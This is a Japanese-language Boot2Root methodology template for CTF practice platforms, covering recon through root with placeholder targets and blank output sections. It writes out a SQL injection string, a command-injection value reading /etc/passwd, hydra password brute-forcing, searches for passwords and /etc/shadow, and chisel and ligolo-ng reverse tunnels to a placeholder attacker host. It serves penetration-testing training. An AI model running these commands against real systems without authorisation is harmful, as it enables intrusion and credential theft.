# Boot2Root - MachineName  
（HackTheBox / VulnHub / TryHackMe）

この Writeup は 1 台のマシンを  
Recon → Enumeration → Initial Access → Local Enumeration → Privilege Escalation → Credential Hunting → Internal Enumeration → Pivot / Port Forward → Lateral Movement → Repeat → Root  
の流れで攻略する Boot2Root 形式の攻略ログです。

---

# 🧭 0. Target Info
- IP: `10.10.x.x`
- OS: Unknown（後で判明）
- Difficulty: Easy / Medium / Hard
- Tags: Web / SMB / FTP / SSH / PrivEsc / Pivot / Tunneling / Linux / Windows

---

# 🎯 1. Recon（初動・外部調査）

外部から見える情報を集め、  
**「どこから攻められるか」**  
を把握するフェーズ。

---
## 🔎 1.1 Nmap（最重要・鉄板）

### ✔ コマンド
```
nmap -p- -T4 -v <TARGET_IP>
nmap -sC -sV -O -T4 <TARGET_IP>
nmap --script vuln <TARGET_IP>
```

### ✔ 出力（証拠）
```
[ここに nmap の出力を貼る]
```

### 🧠 突破口の見つけ方（Nmap）
- **80/443 → Web（最も突破口が多い）**  
- **21 → FTP（anonymous / write）**  
- **22 → SSH（弱パスワード / 鍵）**  
- **139/445 → SMB（認証情報 / share）**  
- **3306 → MySQL（弱パスワード）**  
- **6379 → Redis（未認証）**  
- **8080/8000/5000 → 内部 Web の可能性**  
- **古いバージョン → exploit の可能性**


---

## 🌐 1.2 DNS（名前解決の調査）

### ✔ コマンド
```
dig A <DOMAIN>
dig ANY <DOMAIN>
dig AXFR <DOMAIN> @<TARGET_IP>
```

### ✔ 出力（証拠）
```
[ここに dig の出力を貼る]
```

### 🧠 突破口の見つけ方（DNS）
- サブドメイン → admin / dev / staging  
- AXFR が通る → 内部情報が大量に漏れる  

---

## 🧾 1.3 WHOIS（所有者情報）

```
whois example.com
```

### ✔ 出力（証拠）
```
[ここに WHOIS の出力を貼る]
```

### 🧠 突破口の見つけ方（WHOIS）
- メールアドレス → パスワード推測  
- 組織名 → OSINT に利用  

---

## 🌐 1.4 HTTPヘッダ（Webの詳細情報）

### ✔ コマンド
```
curl -I http://<TARGET_IP>
```

### ✔ 出力（証拠）
```
[ここに HTTP ヘッダの出力を貼る]
```

### 🧠 突破口の見つけ方（HTTPヘッダ）
- Server: Apache/2.4.29 → 古い  
- X-Powered-By: PHP/5 → exploit 多い  
- Location: /admin → 管理画面の存在  

---

## 🔐 1.5 SSL（証明書情報）

### ✔ コマンド
```
openssl s_client -connect <TARGET_IP>:443
```

### ✔ 出力（証拠）
```
[ここに SSL 情報の出力を貼る]
```

### 🧠 突破口の見つけ方（SSL）
- CN / SAN → 内部ホスト名  
- 古い暗号化方式 → 脆弱性の可能性  

---

## 📁 1.6 SMB（共有フォルダ）

### ✔ コマンド
```
smbclient -N -L //<TARGET_IP>/
smbclient //<TARGET_IP>/<SHARE>
```

### ✔ 出力（証拠）
```
[ここに SMB の出力を貼る]
```

### 🧠 突破口の見つけ方（SMB）
- anonymous → 認証不要  
- .txt / .conf → 認証情報  
- バックアップファイル → Web の初期侵入  

---

## 📂 1.7 FTP（ファイルサーバ）

### ✔ コマンド
```
ftp <TARGET_IP>
```

### ✔ 出力（証拠）
```
[ここに FTP の出力を貼る]
```

### 🧠 突破口の見つけ方（FTP）
- anonymous ログイン
- 書き込み可能 → WebShell アップロード  
- Web のソースコード → 脆弱性のヒント  

---

## 🎯 Recon のまとめ（攻撃の方向性を決める）

Recon の目的は **「どこから攻められるか」** を決めること。

- Web がある → ffuf / SQLi / RCE  
- SMB がある → 認証情報 → Web/SSH  
- FTP がある → WebShell アップロード  
- DB がある → 弱パスワード → 横展開  
- Redis がある → SSH key 書き込み  
- ポートが少ない → 内部サービス → pivot 必須  


---

# 📡 2. Enumeration（外部サービスの詳細調査）

## 2-1. Web
```
ffuf -u http://10.10.x.x/FUZZ -w common.txt -e php,txt,bak,old
curl -I http://10.10.x.x
```

## 2-2. SMB
```
smbclient -N -L //10.10.x.x/
```

## 2-3. FTP
```
ftp 10.10.x.x
```

## 2-4. SSH
```
ssh -v user@10.10.x.x
```

### 🧠 思考プロセス
- JS → hidden API / key  
- robots.txt → 隠しディレクトリ  
- SMB/FTP → 認証情報が落ちている  
- Web のユーザー名と SSH が一致する  

---

# 🚪 3. Initial Access（初期侵入）

## 3-1. Web Exploit
```
' OR 1=1-- -
; cat /etc/passwd
http://127.0.0.1:80
```

## 3-2. 弱パスワード
```
hydra -l admin -P rockyou.txt http://10.10.x.x/login
```

## 3-3. Public Exploit
```
searchsploit apache 2.4
```

### 🧠 思考プロセス
- 入力欄 → SQLi / RCE  
- URL 入力欄 → SSRF  
- Cookie / Header も必ず試す  

---

# 🖥 4. Local Enumeration（侵入後のローカル調査）

```
id
whoami
uname -a
ls -la
ps aux
```

### 🧠 思考プロセス
- 実行中のサービスを確認  
- Web アプリのソースコードを探す  
- 認証情報が落ちている可能性  

---

# 🧗 5. Privilege Escalation（権限昇格）

## 5-1. Linux
```
sudo -l
find / -type f -perm -04000 -ls
getcap -r /
```

## 5-2. Windows
```
winPEAS.exe
whoami /priv
```

### 🧠 思考プロセス
- sudo -l → 最も突破口率が高い  
- SUID → find / vim / less / awk  
- Capabilities → python3 cap_setuid  

---

# 🔑 6. Credential Hunting（認証情報探索）

```
grep -Ri "password" /
grep -Ri "SECRET" /
cat /etc/passwd
cat /etc/shadow (権限があれば)
```

### 🧠 思考プロセス
- Web アプリの config  
- DB の接続情報  
- SSH の鍵  
- SMB/FTP のパスワード  

---

# 🛰 7. Internal Enumeration（内部ネットワーク探索）

## 7-1. netstat
```
netstat -tunlp
```

## 7-2. ss
```
ss -tunlp
```

## 7-3. lsof
```
lsof -i -P -n
```

## 7-4. ネットワーク情報
```
ip a
ip route
```

### 🧠 思考プロセス
- 127.0.0.1:8000 → 内部 Web  
- 3306 → MySQL  
- 6379 → Redis  
- 複数 NIC → pivot 必須  

---

# 🔁 8. Pivot / Port Forward（内部サービスへのアクセス）

## 8-1. SSH Local Forward
```
ssh -L 8080:127.0.0.1:8000 user@10.10.x.x
```

## 8-2. SSH Dynamic Forward（SOCKS）
```
ssh -D 9050 user@10.10.x.x
proxychains curl http://internal:8000
```

## 8-3. Chisel
攻撃者側：
```
chisel server -p 9001 --reverse
```

ターゲット側：
```
chisel client attacker_ip:9001 R:socks
```

## 8-4. Ligolo-ng
攻撃者側：
```
sudo ip tuntap add user tun0 mode tun
sudo ip link set tun0 up
ligolo-proxy -selfcert
```

ターゲット側：
```
./agent -connect attacker_ip:11601
```

### 🧠 思考プロセス
- 内部 Web → RCE → 横展開  
- 内部 DB → 認証情報 → SSH  
- pivot → 内部ネットワーク全体を覗く  

---

# 🔀 9. Lateral Movement（横展開）

```
ssh user@internal-host
```

### 🧠 思考プロセス
- credential reuse  
- authorized_keys  
- 内部サービスから別マシンへ  

---

# 🔁 10. Repeat（繰り返し）

内部マシンでも同じ流れを繰り返す：

Recon → Enumeration → Initial Access → Local Enum → PrivEsc → Credential Hunting → Internal Enum → Pivot → Lateral Movement

---

# 👑 11. Root（最終攻略）

```
uname -a
searchsploit linux kernel
cat /root/root.txt
```

### 🧠 思考プロセス
- Kernel exploit  
- cron  
- sudo misconfig  
- root 権限で動くサービス  

---

# 📝 12. Notes（気づき・学び）
- このマシンのポイント  
- 初心者がハマりやすい点  
- 次に活かせるテクニック  

